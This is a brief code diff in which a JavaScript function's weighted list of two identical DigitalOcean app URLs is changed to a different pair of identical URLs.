@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://lionfish-app-2-4naza.ondigitalocean.app/", weight: 0.5 },
-        { url: "https://lionfish-app-2-4naza.ondigitalocean.app/", weight: 0.5 }
+        { url: "https://clownfish-app-bm9wv.ondigitalocean.app/", weight: 0.5 },
+        { url: "https://clownfish-app-bm9wv.ondigitalocean.app/", weight: 0.5 }
       
     ];
 
